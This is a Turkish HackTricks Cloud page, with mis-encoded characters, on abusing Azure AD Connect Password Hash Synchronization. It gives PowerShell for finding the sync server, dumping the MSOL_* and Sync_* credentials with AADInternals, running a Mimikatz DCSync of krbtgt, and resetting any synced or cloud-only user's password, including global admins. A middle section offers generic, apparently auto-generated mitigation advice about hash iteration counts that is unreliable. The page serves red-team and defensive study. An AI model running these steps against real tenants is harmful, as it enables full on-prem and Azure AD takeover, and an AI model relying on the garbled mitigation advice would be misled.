# Az - PHS - Parola Hash Senkronizasyonu

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

[Belgelerden alÄ±nan bilgilere gÃ¶re:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Parola hash senkronizasyonu**, hibrit kimlik saÄŸlamak iÃ§in kullanÄ±lan giriÅŸ yÃ¶ntemlerinden biridir. **Azure AD Connect**, bir kullanÄ±cÄ±nÄ±n parolasÄ±nÄ±n on-premises Active Directory Ã¶rneÄŸinden buluta dayalÄ± bir Azure AD Ã¶rneÄŸine olan parola hash'inin senkronizasyonunu gerÃ§ekleÅŸtirir.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Bu, ÅŸirketlerin on-prem AD'yi Azure AD ile senkronize etmek iÃ§in kullandÄ±ÄŸÄ± **en yaygÄ±n yÃ¶ntemdir**.

TÃ¼m **kullanÄ±cÄ±lar** ve **parola hash'lerinin hash'leri**, on-prem'den Azure AD'ye senkronize edilir. Bununla birlikte, **aÃ§Ä±k metin parolalarÄ±** veya **orijinal hash'ler** Azure AD'ye gÃ¶nderilmez.\
AyrÄ±ca, **dahili** gÃ¼venlik gruplarÄ± (Ã¶rneÄŸin, etki alanÄ± yÃ¶neticileri...) Azure AD'ye **senkronize edilmez**.

**Hash senkronizasyonu**, her **2 dakikada bir** gerÃ§ekleÅŸir. Bununla birlikte, varsayÄ±lan olarak, Azure AD'de **parola sÃ¼resi dolma** ve **hesap sÃ¼resi dolma** senkronize **edilmez**. Bu nedenle, **on-prem parolasÄ± sÃ¼resi dolmuÅŸ** (deÄŸiÅŸtirilmemiÅŸ) bir kullanÄ±cÄ±, eski parolayÄ± kullanarak Azure kaynaklarÄ±na **eriÅŸmeye devam edebilir**.

Bir on-prem kullanÄ±cÄ±sÄ± bir Azure kaynaÄŸÄ±na eriÅŸmek istediÄŸinde, **kimlik doÄŸrulama Azure AD'de** gerÃ§ekleÅŸir.

**PHS**, Kimlik Koruma ve AAD Domain Hizmetleri gibi Ã¶zellikler iÃ§in gereklidir.

## Pivoting

PHS yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda, bazÄ± **yetkili hesaplar** otomatik olarak **oluÅŸturulur**:

* **`MSOL_<installationID>`** hesabÄ± otomatik olarak on-prem AD'de oluÅŸturulur. Bu hesap, **Directory Senkronizasyon HesaplarÄ±** rolÃ¼ verilir (bkz. [belgeler](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), yani **on-prem AD'de replikasyon (DCSync) izinlerine sahiptir**.
* **`Sync_<on-prem ADConnect Sunucusunun adÄ±>_installationID`** adÄ±nda bir hesap Azure AD'de oluÅŸturulur. Bu hesap, Azure AD'deki **herhangi bir kullanÄ±cÄ±nÄ±n parolasÄ±nÄ± sÄ±fÄ±rlayabilir** (senkronize edilen veya yalnÄ±zca bulut) Azure AD'de.

Ã–nceki iki yetkili hesabÄ±n parolalarÄ±, **Azure AD Connect'in yÃ¼klÃ¼ olduÄŸu sunucudaki bir SQL sunucusunda** saklanÄ±r. YÃ¶neticiler, bu ayrÄ±calÄ±klÄ± kullanÄ±cÄ±larÄ±n parolalarÄ±nÄ± aÃ§Ä±k metin olarak Ã§Ä±karabilir.\
VeritabanÄ±, `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf` konumunda bulunur.

Bu tablolardan birinden yapÄ±landÄ±rmayÄ± Ã§Ä±karmak mÃ¼mkÃ¼ndÃ¼r, bunlardan biri ÅŸifrelenmiÅŸtir:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**ÅifrelenmiÅŸ yapÄ±landÄ±rma**, **DPAPI** ile ÅŸifrelenmiÅŸtir ve iÃ§inde on-prem AD'deki **`MSOL_*`** kullanÄ±cÄ±sÄ±nÄ±n parolalarÄ±nÄ± ve AzureAD'deki **Sync\_\***'in parolasÄ±nÄ± iÃ§erir. Bu nedenle, bunlarÄ± ele geÃ§irmek, AD'ye ve AzureAD'ye yÃ¼kseltme yapmayÄ± mÃ¼mkÃ¼n kÄ±lar.

Bu konuÅŸmada, bu kimlik bilgilerinin nasÄ±l depolandÄ±ÄŸÄ± ve ÅŸifrelendiÄŸi hakkÄ±nda [tam bir genel bakÄ±ÅŸ bulabilirsiniz](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### **Azure AD Connect sunucusunu bulma**

Azure AD Connect'in yÃ¼klendiÄŸi **sunucu etki alanÄ±na katÄ±lmÄ±ÅŸ** ise (belgelerde Ã¶nerilen), aÅŸaÄŸÄ±daki komutla bulunabilir:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### MSOL\_\*'Ã¼ KÃ¶tÃ¼ye Kullanma

Bu bÃ¶lÃ¼mde, Azure AD Connect ile yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hibrit kimlik ortamÄ±nda MSOL\_\* yetkilendirmelerini kÃ¶tÃ¼ye kullanma yÃ¶ntemlerini ele alacaÄŸÄ±z.

#### PHS (Parola Hash Senkronizasyonu) SÄ±zdÄ±rma

PHS, Azure AD Connect ile yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hibrit kimlik ortamÄ±nda kullanÄ±lan bir Ã¶zelliktir. Bu Ã¶zellik, kullanÄ±cÄ±larÄ±n parola hash'lerini Azure AD'ye senkronize etmelerine olanak tanÄ±r. Ancak, bu senkronizasyon sÄ±rasÄ±nda parola hash'leri saldÄ±rganlar tarafÄ±ndan ele geÃ§irilebilir.

SaldÄ±rganlar, PHS sÄ±rasÄ±nda parola hash'lerini ele geÃ§irmek iÃ§in Ã§eÅŸitli yÃ¶ntemler kullanabilirler. Bunlardan bazÄ±larÄ± ÅŸunlardÄ±r:

1. **Pass-the-Hash (PtH) SaldÄ±rÄ±sÄ±**: SaldÄ±rganlar, ele geÃ§irdikleri parola hash'lerini kullanarak kimlik doÄŸrulama yapabilirler. Bu sayede, kullanÄ±cÄ±nÄ±n kimlik bilgilerini bilmeksizin sistemlere eriÅŸebilirler.

2. **Parola KÄ±rma SaldÄ±rÄ±sÄ±**: SaldÄ±rganlar, ele geÃ§irdikleri parola hash'lerini kÄ±rarak kullanÄ±cÄ±nÄ±n gerÃ§ek parolasÄ±nÄ± elde etmeye Ã§alÄ±ÅŸabilirler. Bu sayede, kullanÄ±cÄ±nÄ±n hesabÄ±na tam eriÅŸim saÄŸlayabilirler.

PHS sÄ±zdÄ±rma saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in aÅŸaÄŸÄ±daki Ã¶nlemleri almanÄ±z Ã¶nemlidir:

- Azure AD Connect sunucusunun gÃ¼ncel olduÄŸundan emin olun.
- Parola karma algoritmasÄ±nÄ±n gÃ¼venli olduÄŸundan emin olun.
- Parola karma algoritmasÄ±nÄ±n karma gÃ¼cÃ¼nÃ¼ artÄ±rmak iÃ§in tuzlama (salt) kullanÄ±n.
- Parola karma algoritmasÄ±nÄ±n yavaÅŸlatma faktÃ¶rÃ¼nÃ¼ artÄ±rÄ±n.
- Parola karma algoritmasÄ±nÄ±n tekrar sayÄ±sÄ±nÄ± artÄ±rÄ±n.
- Parola karma algoritmasÄ±nÄ±n karma uzunluÄŸunu artÄ±rÄ±n.

Bu Ã¶nlemleri alarak, PHS sÄ±zdÄ±rma saldÄ±rÄ±larÄ±na karÅŸÄ± daha gÃ¼venli bir hibrit kimlik ortamÄ± oluÅŸturabilirsiniz.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Bu kimlik bilgilerini elde etmek iÃ§in [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) aracÄ±nÄ± da kullanabilirsiniz.
{% endhint %}

### Sync\_\* KullanÄ±mÄ±

**`Sync_*`** hesabÄ±nÄ± ele geÃ§irerek, herhangi bir kullanÄ±cÄ±nÄ±n (Global YÃ¶neticiler dahil) ÅŸifresini **sÄ±fÄ±rlamak** mÃ¼mkÃ¼ndÃ¼r.
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Sadece **bulut** kullanÄ±cÄ±larÄ±nÄ±n ÅŸifrelerini deÄŸiÅŸtirmek de mÃ¼mkÃ¼ndÃ¼r (bu beklenmese de).
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Bu kullanÄ±cÄ±nÄ±n ÅŸifresini de Ã§almak mÃ¼mkÃ¼ndÃ¼r.

{% hint style="danger" %}
BaÅŸka bir seÃ§enek, **Sync** kullanÄ±cÄ±sÄ±nÄ±n yapabileceÄŸi **ayrÄ±calÄ±klÄ± izinleri bir hizmet prensibine atamak** ve ardÄ±ndan bu hizmet prensibine eriÅŸmek suretiyle **ayrÄ±calÄ±k yÃ¼kseltme** yapmaktÄ±r.
{% endhint %}

### Sorunsuz SSO

PHS ile Sorunsuz SSO kullanmak mÃ¼mkÃ¼ndÃ¼r ve bu da diÄŸer kÃ¶tÃ¼ye kullanÄ±mlara aÃ§Ä±ktÄ±r. AÅŸaÄŸÄ±daki baÄŸlantÄ±da kontrol edin:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
